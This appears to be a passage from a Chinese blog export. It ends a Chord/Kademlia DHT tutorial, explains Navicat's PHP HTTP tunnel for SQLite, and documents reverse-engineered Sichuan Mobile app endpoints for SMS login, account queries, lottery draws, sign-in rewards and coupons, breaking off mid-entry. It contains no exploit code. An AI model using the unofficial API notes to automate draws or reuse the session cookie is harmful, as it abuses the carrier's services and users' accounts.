个节点, 并且无需中央服务器, 是一个完全自组织的系统. 分布式哈希表有很多中实现算法, 第 3 节和第 4 节会详细介绍其中的两种. 这里我们先来看看它们共通的思想. 地址管理 首先, 在分布式哈希表中, 每个节点和资源都有一个唯一标识, 通常是一个 160 位整数. 为方便起见, 我们称节点的唯一标识为 ID, 称资源的唯一标识为 Key. 我们可以把一个节点的 IP 地址用 SHA-1 算法哈希得到这个节点的 ID; 同样地, 把一个资源文件用 SHA-1 算法哈希就能得到这个资源的 Key 了. 定义好 ID 和 Key 之后, 就可以发布和存储资源了. 每个节点都会负责一段特定范围的 Key, 其规则取决于具体的算法. 例如, 在 Chord 算法中, 每个 Key 总是被第一个 ID 大于或等于它的节点负责. 在发布资源的的时候, 先通过哈希算法计算出资源文件的 Key, 然后联系负责这个 Key 的节点, 把资源存放在这个节点上. 当有人请求资源的时候, 就联系负责这个 Key 的节点, 把资源取回即可. 发布和请求资源有两种做法, 一种是直接把文件传输给负责的节点, 由它存储文件资源; 请求资源时再由这个节点将文件传输给请求者. 另一种做法是由发布者自己设法存储资源, 发布文件时把文件所在节点的地址传输给负责的节点, 负责的节点仅存储一个地址; 请求资源的时候会联系负责的节点获取资源文件的地址, 然后再取回资源. 这两种做法各有优劣. 前者的好处是资源的发布者不必在线, 请求者也能获取资源; 坏处是如果文件过大, 就会产生较大的传输和存储成本. 后者的好处是传输和存储成本都比较小, 但是资源的发布者, 或者说资源文件所在的节点必须一直在线. 路由算法 上面我们简述了地址系统, 以及如何发布和取回资源. 但是现在还有一个大问题: 如何找到负责某个特定 Key 的节点呢? 这里就要用到路由算法了. 不同的分布式哈希表实现有不同的路由算法, 但它们的思路是一致的. 首先每个节点会有若干个其他节点的联系方式(IP 地址, 端口), 称之为路由表. 一般来说一个有着 $n$ 个节点的分布式哈希表中, 一个节点的路由表的长度为 $\mathrm{O}(\log{n})$. 每个节点都会按照特定的规则构建路由表, 最终所有的节点会形成一张网络. 从一个节点发出的消息会根据特定的路由规则, 沿着网络逐步接近目标节点, 最终达到目标节点. 在有着 $n$ 个节点的分布式哈希表中, 这个过程的转发次数通常为 $\mathrm{O}(\log{n})$ 次. 自我组织(self-organization) 分布式哈希表中的节点都是由各个用户组成, 随时有用户加入, 离开或失效; 并且分布式哈希表没有中央服务器, 也就是说着这个系统完全没有管理者. 这意味着分配地址, 构建路由表, 节点加入, 节点离开, 排除失效节点等操作都要靠自我组织策略实现. 要发布或获取资源, 首先要有节点加入. 一个节点加入通常有以下几步. 首先, 一个新节点需要通过一些外部机制联系分布式哈希表中的任意一个已有节点; 接着新节点通过请求这个已有节点构造出自己的路由表, 并且更新其他需要与其建立连接的节点的路由表; 最后这个节点还需要取回它所负责的资源. 此外我们必须认为节点的失效是一件经常发生的事, 必须能够正确处理它们. 例如, 在路由的过程中遇到失效的节点, 会有能够替代它的其他节点来完成路由操作; 会定期地检查路由表中的节点是否有效; 将资源重复存储在多个节点上以对抗节点失效等. 另外分布式哈希表中的节点都是自愿加入的, 也可以自愿离开. 节点离开的处理与节点失效类似, 不过还可以做一些更多的操作, 比如说立即更新其他节点的路由表, 将自己的资源转储到其他节点等. 3. Chord 算法上一节简单介绍了 P2P 网络和分布式哈希表, 现在我们来讨论它的一个具体实现. 分布式哈希表有很多中实现, Ion Stoica 和 Robert Morris 等人在 2001 年的一篇论文中提出了 Chord 算法. Chord 算法比较简洁, 也很漂亮, 这里我们先介绍它. 3.1 地址管理正如 2.3 节所述, Chord 使用一个 m 位整数作为节点和资源的唯一标识. 也就是说标识的取值范围为 $0$ 至 $2^m-1$ 的整数. Chord 把所有的 ID 排列成一个环, 从小到大顺时针排列, 首尾相连. 为了方便起见, 我们称每个 ID 都先于它逆时针方向的 ID, 后于它顺时针方向的 ID. 每个节点都能在这个环中找到自己的位置; 而对于 Key 值为 k 的资源来说, 它总是会被第一个 ID 先于或等于 k 的节点负责. 我们把负责 k 的节点称为 k 的后继, 记作 $successor(k)$. 例如, 如下图所示, 在一个 m = 4 的 Chord 环中, 有 ID 分别为 0, 1, 4, 8, 11, 14 的六个节点. Key 为 1 的资源被 ID 为 1 的节点负责, Key 为 5 的资源被 ID 为 8 的节点负责, Key 为 15 的资源被 ID 为 0 的节点负责. 也就是有 $successor(1)=1$, $successor(5)=8$, $successor(15)=0$. 3.2 路由算法在 Chord 算法中, 每个节点都保存一个长度为 m 的路由表, 存储至多 m 个其他节点的信息, 这些信息能让我们联系到这些节点. 假设一个节点的 ID 为 n(以下简称节点 n), 那么它的路由表中第 i 个节点应为第一个 ID 先于或等于 $n+2^{i-1}$ 的节点, 即 $successor(n+2^{i-1})$, 这里 $1 \leqslant i \leqslant m$. 我们把 n 的路由表中的第 i 个节点记作 $n.finger[i]$. 显然, 路由表中的第一个节点为顺时针方向紧挨着 n 的节点, 我们通常称它为节点 n 的后继节点, 记作 $n.successor$. 有了这个路由表, 我们就可以快速地寻址了. 假设一个节点 n 需要寻找 Key 值为 k 的资源所在的节点, 即寻找 $successor(k)$, 它首先判断 k 是否落在区间 $(n, n.successor]$ 内; 如果是, 则说明这个 Key 由它的后继负责. 否则 n 从后向前遍历自己的路由表, 直到找到一个 ID 后于 k 的节点, 然后把 k 传递给这个节点由它执行上述查找工作, 直到找到为止. 上图展示了从节点 4 寻找节点 1 的过程. 节点 4 的路由表中的节点分别为 8, 11, 14. 它首先会从后向前找到路由表中第一个后于 1 的节点为 14, 然后就请求 14 帮忙寻找 1. 节点 14 的路由表分别为 0, 4, 8; 同样地, 14 就会请求节点 0 帮忙寻找 1. 最终节点 0 找到它的后继即为节点 1. 可以看到, 整个查找过程是逐步逼近目标目标节点的. 离目标节点越远, 跳跃的距离就越长; 离目标节点越近, 跳跃的距离就越短, 越精确. 若整个系统有 N 个节点, 查找进行的跳跃次数就为 $\mathrm{O}(\log N)$. 3.3 自我组织节点加入 一个节点要想加入 Chord 并不难. 上一节说了, Chord 系统中的任意一个节点都能对任意 Key k 找到它的后继 $successor(k)$. 首先, 新节点 $n$ 使用一些算法生成自己的 ID, 然后它需要联系系统中的任意一个节点 $n’$, 让他帮忙寻找 $successor(n)$. 显然, $successor(n)$ 即是 n 的后继节点, 同时也是它路由表中的第一个节点. 接下来它再请求 $n’$ 帮忙分别寻找 $successor(n + 2^1)$, $successor(n + 2^2)$, 等等, 直到构建完自己的路由表. 构建完自己的路由表后, n 基本上算是加入 Chord 了. 不过还不够, 因为这时其他的节点还不知晓它的存在. n 加入后, 有些节点的路由表中本该指向 n 的指针却仍指向 n 的后继. 这个时候就需要提醒这些节点更新路由表. 哪些节点需要更新路由表呢? 我们只需把操作反过来: 对所有的 $1 \leqslant i \leqslant m$, 找到第一个后于 $n - 2^{i-1}$ 的节点. 这与寻找后继相同, 就不再赘述了. 最后, 新节点 n 还需要取回它负责的所有资源. n 只需联系它的后继取回它后继所拥有的所有 Key 后于或等于 n 的资源即可. 处理并发问题 考虑多个节点同时加入 Chord. 如果使用上述方法, 就有可能导致路由表不准确. 为此, 我们不能在新节点加入的时候一次性更新所有节点的路由表. Chord 算法非常重要的一点就是保证每个节点的后继节点都是准确的. 为了保证这一点, 我们希望每个节点都能和它的后继节点双向通信, 彼此检查. 因此我们给每个节点添加一个属性 $n.predecessor$ 指向它的前序节点. 然后, 我们让每个节点定期执行一个操作, 称之为 $stabilize$. 在 $stabilize$ 操作中, 每个节点 $n$ 都会向自己的后继节点 $s$ 请求获取 $s$ 的前序节点 $x$. 然后 $n$ 会检查 $x$ 是否更适合当它的后继, 如果是, $n$ 就它自己的后继更新为 $x$. 同时 $n$ 告诉自己的后继 $s$ 自己的存在, $s$ 又会检查 $n$ 是否更适合当它的前序, 如果是, $s$ 就把自己的前序更新为 $n$. 这个操作足够简单, 又能够保证 Chord 环的准确性. 当新节点 $n$ 加入 Chord 时, 首先联系已有节点 $n’$ 获取到 $n.successor$. $n$ 除了设置好自己的后继之外, 什么都不会做; 此时 $n$ 还没有加入 Chord 环. 这要等到 $stabilize$ 执行之后: 当 $n$ 执行 $stabilize$ 时, 会通知它的后继更新前序为 $n$; 当 $n$ 真正的前序 $p$ 执行 $stabilize$ 时会把自己的后继修正为 $n$, 并通知 $n$ 设置前序为 $p$. 这样 $n$ 就加入到 Chord 环中了. 这样的操作在多个节点同时加入时也是正确有效的. 此外每个节点 $n$ 还会定期修复自己的路由表, 以确保能指向正确的节点. 具体的做法是随机选取路由表中的第 $i$ 个节点, 查找并更新 $n.finger[i]$ 为 $successor(n+2^{i-1})$. 由于 $n$ 的后继节点始终是正确的, 所以这个查找操作始终是有效的. 节点失效与离开 一旦有节点失效, 势必会造成某个节点的后继节点失效. 而后继节点的准确性对 Chord 来说至关重要, 它的失效意味着 Chord 环断裂, 可能导致查找失效, $stabilize$ 操作无法进行. 为了解决这个问题, 一个节点通常会维护多个后继节点, 形成一个后继列表, 它的长度通常是 m. 这样的话, 当一个节点的后继节点失效后, 它会在后继列表中寻找下一个替代的节点. 此外一个节点的失效意味着这个节点上资源的丢失, 因此一个资源除了存储在负责它的节点 n 上之外, 还会被重复地存储在 n 的若干个后继节点上. 节点离开的处理与节点失效相似, 不同的是节点离开时可以做一些额外的操作, 例如通知它周围的节点立即执行 $stabilize$ 操作, 把资源转移到它的后继, 等等. 4. Kademlia 算法Petar Maymounkov 和 David Mazières 在 2002 年的一篇论文中提出了 Kademlia 算法,相比与 Chord 算法, Kademlia 算法容错度更高, 效率也高于 Chord, 也更巧妙合理. 4.1 地址管理Kademlia 同样使用 m 位整数作为节点和资源的唯一标识. 与 Chord 中的 “区间负责制” 不同, Kademlia 中的资源都是被离它最近的节点负责. 出于容错考虑, 每个资源通常都被距离它最近的 k 个节点负责, 这里 k 是一个常量, 通常取 k 使得在系统中任意 k 个节点都不太可能在一小时之内同时失效, 比如取 k = 20. 有趣的是, 这里的 “距离” 并不是数值之差, 而是通过异或运算得出的. 在 Kademlia 中, 每个节点都可以看作一颗高度为 m + 1 的二叉树上的叶子节点. 把 ID 二进制展开, 从最高位开始, 自根节点逢 1 向左逢 0 向右, 直到抵达叶子节点. 如下图所示. Kademlia 的巧妙之处就是定义两个 ID $x$ 和 $y$ 之间的距离为 $x \oplus y$. 异或运算的特点是异为真同为假, 如果两个 ID 高位相异低位相同, 它们异或的结果就大; 如果它们高位相同低位相异, 异或的结果就小. 这与二叉树中叶子的位置分布是一致的: 如果两个节点共有的祖先节点少(高位相异), 它们的距离就远; 反之, 如果共有的祖先节点多(高位相同), 它们的距离就近. 上图标注了一些节点之间的距离, 大家可以感受一下. 异或运算的另一个重要性质是, 异或的逆运算仍是异或. 即如果有 $x \oplus y = d$ 则 $x \oplus d = y$. 这就意味着对于每个节点, 给的一个距离 $d$, 至多有一个与其距离为 $d$ 节点. 这样一来 Kademlia 的拓扑结构是单向的(unidirectional). 单向性确保不管查找从哪个节点开始, 同一 Key 的所有查找都会沿着同一路径收敛. 4.2 路由算法对于任意一个给定节点, 我们将二叉树从根节点开始不断向下分成一系列不包含该节点的子树. 最高的子树由不包含该节点的二叉树的一半组成, 下一个子树又由不包含该节点的剩余树的一半组成, 以此类推. 如果这个二叉树的高度为 m + 1, 我们最终会得到 m 个子树. 接着在每个子树中任取 k 个节点, 形成 m 个 k 桶(k-bucket), 这 m 个 k 桶就是 Kademlia 节点的路由表. 我们定义最小子树中取得的节点为第 0 个 k 桶, 次小的子树中取得的节点为第 1 个 k 桶, 以此类推. 不难看出, 对于每个 $0 \leqslant i &lt; m$, 第 $i$ 个 k 桶中节点与当前节点的距离总是在区间 $[2^i, 2^{i+1})$ 之内. 下图展示了 m = 3, k = 2 时节点 101 的 k 桶. Kademlia 中每个节点都有一个基础操作, 称为 FIND_NODE 操作. FIND_NODE 接受一个 Key 作为参数, 返回当前节点所知道的 k 个距离这个 Key 最近的节点. 基于 k 桶, 找到这 k 个最近的节点很容易: 先求出这个 Key 与当前节点的的距离 $d$; 上面说了, 第 $i$ 个 k 桶中节点与当前节点的距离总是在区间 $[2^i, 2^{i+1})$ 之内, 这些区间都不会互相重叠, 那么显然 $d$ 落在的区间所属的 k 桶中的节点就是距离这个 Key 最近的节点. 如果这个 k 桶中的节点不足 k 个, 则在后一个 k 桶中取节点补充, 如果还不够就再在后一个 k 桶中取. 如果这个节点所有的 k 桶中的节点数之和都不足 k 个, 就返回它所知道的所有节点. 有了 FIND_NODE 操作, 我们就可以定义 Kademlia 中最重要的一个过程, 节点查找(node lookup). 节点查找要做的是, 给定一个 Key, 找出整个系统中距离它最近的 k 个节点. 这是一个递归过程: 首先初始节点调用自己的 FIND_NODE, 找到 k 个它所知的距离 Key 最近的节点. 接下来我们在这 k 个节点中取 $\alpha$ 个最近的节点, 同时请求它们为 Key 执行 FIND_NODE. 这里的 $\alpha$ 也是一个常量, 作用是同时请求提高效率, 比如取 $\alpha = 3$. 在接下来的递归过程中, 初始节点每次都在上一次请求后返回的节点中取 $\alpha$ 个最近的, 并且未被请求过的节点, 然后请求它们为 Key 执行 FIND_NODE, 以此类推. 每执行一次, 返回的节点就距离目标近一点. 如果某次请求返回的节点不比上次请求返回的节点距目标 Key 近, 就向所有未请求过的节点请求执行 FIND_NODE. 如果还不能获取更近的节点, 过程就终止. 这时我们在其中取 k 个距离 Key 最近的节点, 就是节点查找的结果. Kademlia 的大多数操作都基于节点查找. 发布资源时, 只需为资源的 Key 执行节点查找, 获取 k 个距离资源最近的节点, 把资源存储在这些节点上. 获取资源也类似, 也只需为目标资源的 Key 执行节点查找, 不同的是一旦遇到拥有目标资源的节点就停止查找. 此外, 一旦一个节点查找成功, 它就会把资源缓存在离自己最近的节点上. 因为 Kademlia 的拓扑结构是单向的, 其他离目标资源比自己远的节点在查找时就很可能会经由缓存的节点, 这样就能提前终止查找, 提高了查找效率. 4.3 自我组织k 桶的维护 所有的 k 桶都遵循最近最少使用(Least Recently Used, LRU)淘汰法. 最近最少活跃的节点排在 k 桶的头部, 最近最多活跃的节点排在 k 桶尾部. 当一个 Kademlia 节点接收到任何来自其他节点的消息(请求或响应)的时候, 都会尝试更新相应的 k 桶. 如果这个节点在接收者对应的 k 桶中, 接收者就会把它移动到 k 桶的尾部. 如果这个节点不在相应的 k 桶中, 并且 k 桶的节点小于 k 个, 那么接收者就会直接把这个节点插入到这个 k 桶的尾部. 如果相应的 k 桶是满的, 接收者就会尝试 ping 这个 k 桶中最近最少活跃的节点. 如果最近最少活跃的节点失效了, 那么就移除它并且将新节点插入到 k 桶的尾部; 否则就把最近最少活跃的节点移动到 k 桶尾部, 并丢弃新节点. 通过这个机制就能在的通信的同时刷新 k 桶. 为了防止某些范围的 Key 不易被查找的情况, 每个节点都会手动刷新在上一小时未执行查找的 k 桶. 做法是在这个 k 桶中随机选一个 Key 执行节点查找. 节点加入 一个新节点 $n$ 要想加入 Kademlia, 它首先使用一些算法生成自己的 ID, 然后它需要通过一些外部手段获取到系统中的任意一个节点 $n’$, 把 $n’$ 加入到合适的 k 桶中. 然后对自己的 ID 执行一次节点查找. 根据上述的 k 桶维护机制, 在查找的过程中新节点 $n$ 就能自动构建好自己的 k 桶, 同时把自己插入到其他合适节点的 k 桶中, 而无需其他操作. 节点加入时除了构建 k 桶之外, 还应该取回这个节点应负责的资源. Kademlia 的做法是每隔一段时间(例如一个小时), 所有的节点都对其拥有的资源执行一次发布操作; 此外每隔一段时间(例如24小时)节点就会丢弃这段时间内未收到发布消息的资源. 这样新节点就能收到自己须负责的资源, 同时资源总能保持被 k 个距离它最近的节点负责. 如果每个小时所有节点都重发它们所拥有的资源, 就有些浪费了. 为了优化这一点, 当一个节点收到一个资源的发布消息, 它就不会在下一个小时重发它. 因为当一个节点收到一个资源的发布消息, 它就可以认为有 k - 1 个其他节点也收到了这个资源的发布消息. 只要节点重发资源的节奏不一致, 这就能保证每个资源都始终只有一个节点在重发. 节点失效和离开 有了上述 k 桶维护和资源重发机制, 我们不需要为节点的失效和离开做任何其它的工作. 这也是 Kademlia 算法的巧妙之处, 它的容错性要高于其他分布式哈希表算法. 5. 总结这篇文章介绍了 P2P 技术和分布式哈希表, 以及两种分布式哈希表算法, 基本介绍了它们的原理和实现机制. 文本也是笔者对这两篇论文学习的总结, 限于篇幅和笔者的精力, 对于其中的一些实现细节, 策略背后的理论和实验支撑, 算法的证明等未予阐述. 建议想要深入学习的同学阅读参考资料中的内容. 搭建 P2P 架构是一项很有挑战性的工作, 笔者认为即使不从事 P2P 开发, 了解和学习 P2P 技术对于服务器架构方面也是很有帮助的. 参考资料 Peer-to-Peer Systems and Applications Chord: A scalable peer-to-peer lookup service for internet applications Kademlia: A Peer-to-Peer Information System Based on the XOR Metric .posts-expand .post-body img{margin:0 auto; height:300px;}]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Navicat使用HTTP通道远程连接SQLite]]></title>
    <url>%2Farticles%2FNavicat%E4%BD%BF%E7%94%A8HTTP%E9%80%9A%E9%81%93%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5SQLite%2F</url>
    <content type="text"><![CDATA[在线上环境的服务器，一般都是关闭了数据库外网访问的权限，这时候外网就不能直接连接数据库了，需要在服务器内才能操作数据库。但Navicat软件提供了HTTP通道代理连接数据库功能，只要服务器上有HTTP服务，并且端口开放了，就可以使用HTTP通道来连接数据库。 基本原理数据库端口没开放外网访问的时候，Navicat在外网无法访问数据库。 服务器上运行着PHP，并且我们是可以访问到PHP的。 PHP可以连接SQLite数据库并执行SQL语句，因为它们都在内网和PHP支持SQLite。 虽然Navicat无法连接上SQLite，但是Navicat对数据库所有的查询可以让PHP代为查询，然后把结果返回给Navicat。 所以把一个php脚本放到服务器上，就可以让Navicat间接连接数据库，对数据库进行操作了。 上传PHP脚本Navicat软件自带三个php代理脚本，它在Navicat安装目录下，分别是：ntunnel_sqlite.php ntunnel_pgsql.php ntunnel_sqlite.php 点击获取 这里主要讲SQLite，所以用到的是ntunnel_sqlite.php脚本，其他数据库基本同理。 将ntunnel_sqlite.php上传到服务器(远程服务器必须支持php环境)，并测试能否通过浏览器访问到 Navicat连接设置在新建或者编辑连接的时候，选项卡里面都会有一个HTTP，切换到HTTP选项卡。 然后勾选使用HTTP通道，通道网址处输入ntunnel_sqlite.php的网址。 建议勾选上用base64编码传出查询，不然有可能出现700 Invalid response: 500错误。 这个错误主要出现在获取数据库列表和表结构的时候出现，服务器有使用防护软件，也有可能是它捣的鬼。 然后在常规选项卡里，设置好端口、用户名、密码，主机输入127.0.0.1或者对应的内网IP。 简单来说就是服务器上项目配置里的数据库连接配置怎么设置的，这里就怎么设置，因为是用php来代替连接数据库 测试连接最后，测试下连接。如果有错误，先重启navicate，还不行的话再按照错误信息修改下对应的配置即可。 附件如果你不知道在哪找到通道脚本，关注下面微信号，回复 navicat 即可获取。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[四川移动掌厅APP接口分析]]></title>
    <url>%2Farticles%2F%E5%9B%9B%E5%B7%9D%E7%A7%BB%E5%8A%A8%E6%8E%8C%E5%8E%85APP%E6%8E%A5%E5%8F%A3%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[登录获取短信验证码简要描述： 获取短信验证码 请求URL： http://wap.sc.10086.cn/scmccCampaign/newturntable/getYzm.do 请求方式： POST 参数： 参数名 必选 类型 说明 phone 是 string 手机号，需要base64编码 返回示例 1234567&#123; "result": &#123; "obj": null, "code": 0,// 0表示发送成功 4发送过于频繁 "info": "" &#125;&#125; 短信登录简要描述： 短信登录 请求URL： http://wap.sc.10086.cn/scmccCampaign/newturntable/drawdenglu.do 请求方式： POST 参数： 参数名 必选 类型 说明 desdrawPhone 是 string 手机号，需要base64编码 yzm 是 string 验证码 返回示例 12345678&#123; "result": &#123; "obj": null, "code": 0, // 0表示登录成功 11验证码校验失败 12验证码已过期 "info": "xxxx" // 返回单点登录的token &#125;&#125;// 返回的Cookie中SSOCookie就是单点登录凭证,这个SSOCookie有很大的安全问题，不知是不是厂商故意这么做的 用户信息当前用户信息简要描述： 用户信息 请求URL： https://wap.sc.10086.cn/scmccClientWap/novelInfoUnifiedQuery/queryNovelUserInfo.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 1234567891011121314&#123; "result": &#123; "obj": &#123; "starLevel": "2", // 用户级别 "balance": "41.92",// 话费余额 "score": "253",// 可用积分 "yx_PREPAY": "0",// 营销抵消话费 "currMonthConsume": "12.54",// 当月消费情况 "mobile": "&#123;当前用户手机号明文&#125;"// 当前账户手机号 &#125;, "code": 0, "info": "成功" &#125;&#125; 用户流量信息简要描述： 用户流量信息 请求URL： https://wap.sc.10086.cn/scmccClientWap/novelInfoUnifiedQuery/queryNovelPackageSurplus.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 123456789101112131415161718192021&#123; "result": &#123; "obj": &#123; "retval": "E00", "surplusSMS": 60, "lastMthFlow": "32.00MB", "surplusFlow": "9.70GB", "usedFlow": "1.75GB", "flowTotal": 12009472, "usedVoice": 0, "smsTotal": 60, "newsurplusFlow": "9.70GB", "newUsedFlow": "1.75GB", "usedSMS": 0, "voiceTotal": 0, "surplusVoice": 0 &#125;, "code": 0, "info": "成功" &#125;&#125; 转盘抽奖活动抽奖简要描述： 抽奖 请求URL： http://wap.sc.10086.cn/scmccCampaign/newturntable/dzpDraw.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie canals 是 string sh2: 网页点击分享的转盘抽奖 zt1: APP的H5转盘抽奖 返回示例 1234567891011121314151617&#123; "result": &#123; "obj": &#123; "f_date": "20200406", "f_send_status": "8", "f_phone": "&#123;当前用户手机号明文&#125;", "f_channel": "", "f_prize_name": "谢谢参与", "f_prize_id": "99", "f_canals": "zt1", "f_todayChar6": "202004", "si": "99" &#125;, "code": 7, // 7表示没有抽中将 4表示当天抽奖次数已耗尽 5表示提交过于频繁（官方建议是间隔30秒） "info": "谢谢参与！" &#125;&#125; 当月中奖情况简要描述： 当月中奖情况 请求URL： https://wap.sc.10086.cn/scmccCampaign/newturntable/getRewardInfo.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 1234567891011121314151617&#123; "result": &#123; "obj": [ &#123; "F_EXPENSETYPE": 10, "F_ID": "200401072155157354", "F_CODE": null, "F_PRIZE_ID": "4", "F_PRIZE_NAME": "饿了么红包", "F_TIME": "2020.04.01", "F_SEND_STATUS": 1 &#125; ], "code": 0, "info": "" &#125;&#125; 签到签到状态简要描述： 签到状态 请求URL： https://wap.sc.10086.cn/scmccCampaign/signCalendar/signed.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 1234567&#123; "result": &#123; "obj": 1, // 1表示已签 0表示未签 "code": 0, "info": "" &#125;&#125; 签到历史简要描述： 签到历史 请求URL： https://wap.sc.10086.cn/scmccCampaign/signCalendar/signHistory.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 1234567891011121314&#123; "result": &#123; "obj": [ "20200401", "20200402", "20200403", "20200404", "20200405", "20200406" ], "code": 0, "info": "" &#125;&#125; 签到简要描述： 签到 请求URL： https://wap.sc.10086.cn/scmccCampaign/signCalendar/sign.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 1234567&#123; "result": &#123; "obj": 6, // code=0时返回，当月合计签到天数 "code": 0,// 0 签到成功 2 已经签到 "info": "noADs" &#125;&#125; 签到奖励简要描述： 签到奖励 请求URL： https://wap.sc.10086.cn/scmccCampaign/signCalendar/queryPrizeAndDrawStatusNew.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&#123; "result":&#123; "obj":&#123; "isHand":"0", // 0 表示可以抽奖 1表示未办理会员 2表示查询失败 "dayNum":7, // 当前已签到天数 "prizes":[ &#123; "DAYCOUNT":3,// 需要签到天数 "PRIZENAME":"200M国内", "DRAWSTATUS":"1", // 是否已经领取 1是 0否 "TYPE":1 &#125;, &#123; "DAYCOUNT":7, "PRIZENAME":"500M国内", "DRAWSTATUS":"1",// 是否已经领取 1是 0否 "TYPE":2 &#125;, &#123; "DAYCOUNT":15, "PRIZENAME":"幸运礼包", "DRAWSTATUS":"0",// 是否已经领取 1是 0否 "TYPE":3 &#125; ], // 对应的奖品 "cards": [ &#123; "CARDID": "ZT_2020430_200M", "RECEIVEPHONE": "xxxxxxx", "USESTATE": "1", "BIZID": "20200505091302388179", "RECEIVETIME": "20200505091359608", "USEDATE": "20200505091545044", "USEBEGINTIME": "20200505", "RECEIVEPHONENUM": "xxxx", "COMMERCIALFISRTNUM": "CH000161", "SENDORFROM": "2", "SENDPHONE": null, "PARENTCARDNUM": "FQCH00002069", "USEENDTIME": "20200531", "CHILDCARDNUM": "ZQ202005050202732986", "CHILDCARDNAME": "签到有礼流量券" &#125;, &#123; "CARDID": "ZT_2020430_200M", "RECEIVEPHONE": null, "USESTATE": "0", "BIZID": "20200511155813502102", "RECEIVETIME": "20200511155813513", "USEDATE": null, "USEBEGINTIME": "20200511", "RECEIVEPHONENUM": "xxxx", "COMMERCIALFISRTNUM": "CH000161", "SENDORFROM": null, "SENDPHONE": null, "PARENTCARDNUM": "FQCH00002069", "USEENDTIME": "20200531", "CHILDCARDNUM": "ZQ202005110203266865", "CHILDCARDNAME": "签到有礼流量券" &#125;, &#123; "CARDID": "ZT_2020430_500M", "RECEIVEPHONE": null, "USESTATE": "0", "BIZID": "20200511155553663529", "RECEIVETIME": "20200511155553671", "USEDATE": null, "USEBEGINTIME": "20200511", "RECEIVEPHONENUM": "xxxx", "COMMERCIALFISRTNUM": "CH000161", "SENDORFROM": null, "SENDPHONE": null, "PARENTCARDNUM": "FQCH00002071", "USEENDTIME": "20200531", "CHILDCARDNUM": "ZQ202005110203266814", "CHILDCARDNAME": "签到有礼流量券" &#125; ] &#125;, "code":0, "info":"" &#125;&#125; 领取签到奖励简要描述： 领取签到奖励 请求URL： https://wap.sc.10086.cn/scmccCampaign/signCalendar/drawNew.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie type 是 string 对应上面签到奖励 obj.prizes.TYPE 返回示例 12345678910111213141516171819202122&#123; "result":&#123; "obj":&#123; // 抽中奖励 "f_date": "20200511", "f_table_name": "t_act_cale_draw202005", "f_expensetype": "6", "f_phone": "&#123;当前用户手机号明文&#125;", "f_send_status": "1", "f_expensecode": "ZT_2020430_500M", "f_type_name": "流量", "f_type": "2", "f_prize": "500M国内流量券", "f_num": 500, "f_act_name": "微博签到", "month": "202005", "f_bizId": "20200511155153663529" &#125;, "code":4, // 0 抽中奖品 1登录超时 2服务器繁忙 3当obj=2或者4时活动未开始、3已结束 4已经抽过 5服务器繁忙 6奖品已经被抢完 7未抽中 11未办理会员 "info":"" &#125;&#125; 卡券卡券列表简要描述： 卡券列表，这个接口会返回所有卡券信息，前端自己进行分类 请求URL： https://wap.sc.10086.cn/scmccClient/fusionCardCoupons.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie type 是 string 2 返回示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 返回数据需要base64解码&#123; "msg":"卡券查询成功!", "retObj":&#123; "usedList":[ // 已经使用 ], "O2OList":[// o2o未使用 ], "expiredList":[// 过期 ], "ZTList":[// 未使用 &#123; "busiType":"1", "canBeGiveAway":"1", "cardAmount":"500M国内流量", "cardName":"签到有礼流量券", "channel":"1", "couponNum":"ZQ202004080200553283", "couponType":"2", "desc":"null", "effectDateBgn":"20200408", "effectDateEnd":"20200430", "effectDateRela":"", "effectDateType":"0", "effectTimeBgn":"000000", "effectTimeEnd":"235959", "exParam3":"1", "exParam4":"确认办理吗？", "exParam5":"恭喜您，使用成功!", "exParam6":"对不起，使用失败", "fromType":"1", "luckyTruntable":"0", "numMain":"CC000311", "parentCardNum":"FQCH00001999", "receivePhone":"null", "sendOrFrom":"null", "sendPhone":"null", "useState":"0" &#125; ] &#125;&#125; 卡券使用简要描述： 直接本机使用该卡券 请求URL： https://wap.sc.10086.cn/scmccClient/fusionCardCoupons.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie type 是 string 1 parms 是 JSONObject 对应奖品对象,上面卡券列表的一个item parms参数示例 12345678910111213141516171819202122232425262728 &#123; "busiType":"1", "canBeGiveAway":"1", "cardAmount":"500M国内流量", "cardName":"签到有礼流量券", "channel":"1", "couponNum":"ZQ202004080200553283", "couponType":"2", "desc":"null", "effectDateBgn":"20200408", "effectDateEnd":"20200430", "effectDateRela":"", "effectDateType":"0", "effectTimeBgn":"000000", "effectTimeEnd":"235959", "exParam3":"1", "exParam4":"确认办理吗？", "exParam5":"恭喜您，使用成功!", "exParam6":"对不起，使用失败", "fromType":"1", "luckyTruntable":"0", "numMain":"CC000311", "parentCardNum":"FQCH00001999", "receivePhone":"null", "sendOrFrom":"null", "sendPhone":"null", "useState":"0"&#125; 返回示例 12345&#123; "returnCode":"1", // 1 成功 0失败 "msg":"success", "retObj":null&#125; 卡券转送验证码简要描述： 卡券转送验证码，和登录验证码类似 请求URL： https://wap.sc.10086.cn/scmccClient/cardSmsCoupons.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 